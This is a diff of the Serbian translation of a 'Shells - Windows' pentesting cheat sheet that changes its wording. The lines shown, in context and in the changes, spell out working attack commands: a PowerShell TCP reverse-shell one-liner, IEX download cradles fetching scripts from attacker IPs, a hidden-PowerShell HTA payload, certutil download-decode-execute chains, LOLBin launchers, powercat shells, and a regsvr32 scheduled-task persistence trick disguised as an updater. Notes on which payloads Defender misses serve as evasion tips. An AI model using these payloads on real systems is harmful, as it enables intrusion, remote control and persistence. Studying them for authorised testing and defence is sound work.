@@ -1,11 +1,13 @@
 # Shells - Windows
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Lolbas
 
-Stranica [lolbas-project.github.io](https://lolbas-project.github.io/) namenjena je Windowsu, baš kao što je [https://gtfobins.github.io/](https://gtfobins.github.io/) namenjen Linuxu.<sup>[[13]](#references)[[14]](#references)</sup>
-Windows koristi access tokens i privilegije za bezbednost procesa, a Windows 11 takođe uključuje opcionalnu komandu `sudo`.<sup>[[11]](#references)[[12]](#references)</sup> Korisno je znati **kako** se neki **binaries** mogu (zlo)upotrebiti za izvršavanje neočekivanih radnji, kao što je **executing arbitrary code**.<sup>[[13]](#references)</sup>
+Stranica [lolbas-project.github.io](https://lolbas-project.github.io/) namenjena je Windowsu, kao što je [https://gtfobins.github.io/](https://gtfobins.github.io/) namenjen Linuxu.<sup>[[13]](#references)[[14]](#references)</sup>
+Windows koristi access tokens i privilegije za bezbednost procesa, a Windows 11 takođe uključuje opcionalnu komandu `sudo`.<sup>[[11]](#references)[[12]](#references)</sup> Korisno je znati **kako** se neki **binaries** mogu (zlo)upotrebiti za izvršavanje neočekivanih radnji, kao što je **izvršavanje proizvoljnog koda**.<sup>[[13]](#references)</sup>
 
-Osnovni Windows reverse-shell payload-i prikupljeni u nastavku takođe su dokumentovani u cheat sheet-ovima HighOn.Coffee i PayloadsAllTheThings; prilagodite putanje i instalirane interpretere ciljnom sistemu.<sup>[[1]](#references)[[4]](#references)</sup>
+Osnovni Windows reverse-shell payloads prikupljeni u nastavku takođe su dokumentovani u cheat sheets dokumentima HighOn.Coffee i PayloadsAllTheThings; prilagodite putanje i instalirane interpretere ciljnom sistemu.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## NC
 ```bash
@@ -27,7 +29,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i bezbedna alternativa za Netcat**. Radi na sistemima sličnim Unix-u i Win32 sistemima. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirano ponovno povezivanje, sbd pruža svestrano rešenje za TCP/IP komunikaciju. Korisnici Windows-a mogu koristiti verziju sbd.exe iz Kali Linux distribucije kao pouzdanu zamenu za Netcat.<sup>[[15]](#references)</sup>
+**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i bezbedna alternativa za Netcat**. Radi na Unix-like sistemima i Win32. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirano ponovno povezivanje, sbd pruža svestrano rešenje za TCP/IP komunikaciju. Korisnici Windows-a mogu koristiti verziju sbd.exe iz Kali Linux distribucije kao pouzdanu zamenu za Netcat.<sup>[[15]](#references)</sup>
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -81,19 +83,19 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Proces koji obavlja network call: **powershell.exe**\
-Payload upisan na disk: **NO** (_barem nigde gde sam mogao da ga pronađem koristeći procmon !_).<sup>[[5]](#references)</sup>
+Proces koji izvršava mrežni poziv: **powershell.exe**\
+Payload upisan na disk: **NE** (_barem nigde gde sam mogao da pronađem koristeći procmon !_).<sup>[[5]](#references)</sup>
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Proces koji obavlja mrežni poziv: **svchost.exe**\
-Payload zapisan na disk: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
+Payload upisan na disk: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
 
-**Jednolinijski kod:**
+**One liner:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Više informacija o različitim Powershell Shells nalazi se na kraju ovog dokumenta**
+**Više informacija o različitim Powershell Shells na kraju ovog dokumenta**
 
 ## Mshta
 
@@ -113,9 +115,9 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Veoma lako možete preuzeti i izvršiti Koadic zombie koristeći stager hta**.<sup>[[3]](#references)</sup>
+**Možete veoma lako preuzeti i izvršiti Koadic zombie koristeći hta stager**.<sup>[[3]](#references)</sup>
 
-#### hta primer
+#### primer hta
 
 [**Odavde**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f).<sup>[[7]](#references)</sup>
 ```xml
@@ -165,7 +167,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll hello world primer**](https://github.com/carterjones/hello-world-dll)
+[**DLL hello world primer**](https://github.com/carterjones/hello-world-dll)
 
 - [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 ```bash
@@ -175,9 +177,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Detektovano od strane defendera**
-
-**Rundll32 - sct**
+**Detektuje ga Defender**
 
 Ponovo upotrebite scriptlet prikazan u odeljku [mshta - sct](#mshta-sct); njegov početni komentar sadrži odgovarajući `rundll32.exe` launcher.<sup>[[8]](#references)</sup>
 
@@ -208,12 +208,12 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 **Detektuje defender**
 
-#### Regsvr32 – proizvoljan DLL export sa /i argumentom (gatekeeping & persistence)
+#### Regsvr32 – proizvoljni DLL export sa /i argumentom (gatekeeping i persistence)
 
-Pored učitavanja udaljenih scriptlet-a (`scrobj.dll`), `regsvr32.exe` će učitati lokalni DLL i pozvati njegove `DllRegisterServer`/`DllUnregisterServer` export-e. Custom loader-i ovo često zloupotrebljavaju za izvršavanje proizvoljnog koda, uz istovremeno prikrivanje iza potpisanog LOLBin-a. Dve tradecraft napomene uočene u praksi:<sup>[[6]](#references)</sup>
+Pored učitavanja udaljenih scriptlet-a (`scrobj.dll`), `regsvr32.exe` će učitati lokalni DLL i pozvati njegove `DllRegisterServer`/`DllUnregisterServer` exporte. Custom loaderi često zloupotrebljavaju ovo za izvršavanje proizvoljnog koda uz prikrivanje pomoću potpisanog LOLBin-a. Dve tradecraft napomene viđene u praksi:<sup>[[6]](#references)</sup>
 
-- Gatekeeping argument: DLL se gasi osim ako se preko `/i:<arg>` ne prosledi određeni switch, npr. `/i:--type=renderer`, kako bi oponašao Chromium renderer child procese. Ovo smanjuje slučajno izvršavanje i otežava rad sandbox-ova.
-- Persistence: zakažite `regsvr32` da pokreće DLL u silent režimu, sa visokim privilegijama i obaveznim `/i` argumentom, predstavljajući ga kao updater task:
+- Gatekeeping argument: DLL se gasi osim ako se ne prosledi određeni switch preko `/i:<arg>`, npr. `/i:--type=renderer`, kako bi oponašao Chromium renderer children. Ovo smanjuje slučajno izvršavanje i otežava rad sandbox-ova.
+- Persistence: podesite da se `regsvr32` pokreće radi izvršavanja DLL-a sa silent + high privileges i potrebnim `/i` argumentom, uz maskiranje kao updater task:
 ```powershell
 Register-ScheduledTask \
 -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -224,7 +224,7 @@ Register-ScheduledTask \
 -RunLevel Highest
 ```
 
-Pogledajte i: ClickFix clipboard‑to‑PowerShell varijantu koja postavlja JS loader i kasnije ostvaruje persistence pomoću `regsvr32`.<sup>[[6]](#references)</sup>
+Pogledajte takođe: ClickFix clipboard‑to‑PowerShell varijantu koja priprema JS loader i kasnije uspostavlja persistence pomoću `regsvr32`.<sup>[[6]](#references)</sup>
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
@@ -266,11 +266,11 @@ Preuzmite B64dll, dekodirajte ga i izvršite.<sup>[[5]](#references)</sup>
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Preuzmite B64exe, dekodirajte ga i izvršite ga.<sup>[[5]](#references)</sup>
+Preuzmite B64exe, dekodirajte ga i izvršite.<sup>[[5]](#references)</sup>
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Detektovano od strane Defendera**
+**Otkriveno od strane defendera**
 
 ## **Cscript/Wscript**
 ```bash
@@ -280,7 +280,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Detektuje defender**
+**Detektuje Defender**
 
 ## PS-Bat
 ```bash
@@ -296,7 +296,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Detektovano od strane defendera**
+**Otkriveno od strane defendera**
 
 ## **MSIExec**
 
@@ -329,7 +329,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Nije detektovano**
+**Nije otkriveno**
 
 **Možete veoma lako preuzeti i izvršiti Koadic zombie koristeći stager wmic**.<sup>[[3]](#references)</sup>
 
@@ -339,8 +339,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Ovaj projekat dokumentuje MSBuildShell kao PowerShell host koji može da zaobiđe application whitelisting i ograničenja za `powershell.exe` i pruži shell nalik PowerShell-u.<sup>[[16]](#references)</sup>\
-Samo ga preuzmite i izvršite: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
+Ovaj projekat dokumentuje MSBuildShell kao PowerShell host koji može da zaobiđe application whitelisting i ograničenja za `powershell.exe` i obezbedi shell nalik PowerShell-u.<sup>[[16]](#references)</sup>\
+Samo preuzmite ovo i izvršite: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -348,11 +348,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kompajlirajte C# kod na victim mašini.<sup>[[17]](#references)[[18]](#references)</sup>
+Kompajlirajte C# kod na žrtvinoj mašini.<sup>[[17]](#references)[[18]](#references)</sup>
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Možete preuzeti osnovni C# reverse shell sa ove adrese: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Osnovni C# reverse shell možete preuzeti ovde: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nije detektovano**
 
@@ -362,7 +362,7 @@ Možete preuzeti osnovni C# reverse shell sa ove adrese: [https://gist.github.co
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**Nisam isprobao**
+**Nisam probao**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182).<sup>[[2]](#references)</sup>
 
@@ -382,15 +382,15 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-U folderu **Shells** nalazi se mnogo različitih shell-ova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_, napravite kopiju skripte i dodajte na kraj fajla:<sup>[[19]](#references)</sup>
+U folderu **Shells** nalazi se mnogo različitih shell-ova. Da biste preuzeli i izvršili Invoke-_PowerShellTcp.ps1_, napravite kopiju script-a i dodajte na kraj fajla:<sup>[[19]](#references)</sup>
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Pokrenite serviranje skripte na web serveru i izvršite je na strani žrtve:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
+Pokrenite skriptu na web serveru i izvršite je na strani žrtve:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender ga ne detektuje kao maliciozni kod (još uvek, 3/04/2019).
+Defender ga ne detektuje kao malicious code (još uvek, 3/04/2019).
 
 **TODO: Proveriti druge nishang shells**
 
@@ -402,7 +402,7 @@ Preuzmite ga, pokrenite web server, pokrenite listener i izvršite ga na strani 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender ga ne detektuje kao malicious code (još uvek, 3/04/2019).
+Defender ga još uvek ne detektuje kao malicious code (3/04/2019).
 
 **Druge opcije koje powercat nudi:**
 
@@ -427,11 +427,11 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Kreirajte powershell launcher, sačuvajte ga u datoteci i preuzmite i izvršite ga.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
+Kreirajte PowerShell launcher, sačuvajte ga u datoteci, a zatim ga preuzmite i izvršite.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Detektovano kao zlonamerni kod**
+**Detektovano kao maliciozni kod**
 
 ### MSF-Unicorn
 
@@ -449,7 +449,7 @@ Pokrenite web server koji poslužuje fajl _powershell_attack.txt_ i izvršite na
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Detektovano kao zlonamerni kod**
+**Detektovano kao malicious code**
 
 ## Više
 
@@ -463,25 +463,25 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 - [2] [GitHub Gists korisnika Arno0x](https://gist.github.com/Arno0x)
 - [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 - [4] [Cheatsheet za Reverse Shell - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [Windows Oneliners za preuzimanje udaljenog Payload-a i izvršavanje proizvoljnog koda](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-- [6] [Check Point Research – Iza čiste zavese: Od RAT-a do Builder-a i Coder-a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
-- [7] [calc.hta – primer HTA reverse izvršavanja (Arno0x gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+- [5] [Windows Oneliners za preuzimanje udaljenog payload-a i izvršavanje proizvoljnog koda](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [6] [Check Point Research – Ispod čiste zavese: od RAT-a do buildera i codera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [7] [calc.hta – primer obrnutog izvršavanja HTA koda (Arno0x gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 - [8] [scriptlet.sct – primer mshta/rundll32 scriptlet-a (Arno0x gist)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 - [9] [regsvr32.sct – primer Regsvr32 scriptlet-a (Arno0x gist)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 - [10] [wmic.xsl – primer WMIC XSL stylesheet-a (Arno0x gist)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
-- [11] [Access Tokens – Win32 aplikacije (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- [11] [Access Tokens – Win32 apps (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
 - [12] [Sudo za Windows (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
 - [13] [LOLBAS](https://lolbas-project.github.io/)
 - [14] [GTFOBins](https://gtfobins.github.io/)
-- [15] [sbd | Kali Linux alati](https://www.kali.org/tools/sbd/)
+- [15] [sbd | Kali Linux Tools](https://www.kali.org/tools/sbd/)
 - [16] [MSBuildShell](https://github.com/Cn33liz/MSBuildShell)
-- [17] [Opcije Compiler-a – pravila jezičkih funkcija (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
-- [18] [Opcije Compiler-a – opcije izlaza (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
+- [17] [Compiler Options – pravila jezičkih funkcija (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
+- [18] [Compiler Options – opcije izlaza (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
 - [19] [Nishang](https://github.com/samratashok/nishang)
 - [20] [Invoke-WebRequest (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1)
 - [21] [Invoke-Expression (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
 - [22] [powercat](https://github.com/besimorhino/powercat)
-- [23] [Empire (arhivirani repozitorijum)](https://github.com/EmpireProject/Empire)
+- [23] [Empire (arhivirani repository)](https://github.com/EmpireProject/Empire)
 - [24] [Unicorn](https://github.com/trustedsec/unicorn)
 - [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
 - [26] [Empire Wiki](https://bc-security.gitbook.io/empire-wiki/)
